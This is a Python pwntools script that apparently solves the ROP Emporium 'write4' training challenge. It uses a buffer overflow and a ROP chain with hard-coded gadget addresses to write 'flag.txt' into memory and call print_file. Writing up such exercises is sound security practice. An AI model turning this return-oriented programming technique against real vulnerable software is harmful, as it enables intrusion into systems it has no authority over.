#!/usr/bin/python3 


from readline import write_history_file
from pwn import *

elf = context.binary = ELF('write4')

info("%#x print_file", elf.symbols.print_file)
print_file = p64(elf.symbols.print_file)


offset             = 40
writable_addr      = p64(0x0000000000601038)
gadget_pop_r14_r15 = p64(0x0000000000400690)
val_r14            = writable_addr
val_r15            = b"flag.txt"   # put value in r15
write_to           = p64(0x0000000000400628)
gadget_pop_rdi     = p64(0x0000000000400693)
print_file_addr    = p64(0x00400510)
payload = b'A'*offset \
    + gadget_pop_r14_r15 + val_r14 + val_r15 \
    + write_to \
    + gadget_pop_rdi + writable_addr \
    + print_file_addr

io = process(elf.path)
io.sendline(payload)
io.interactive()
while 1:
    try:
        print(io.recvline().decode())
    except:
        exit()
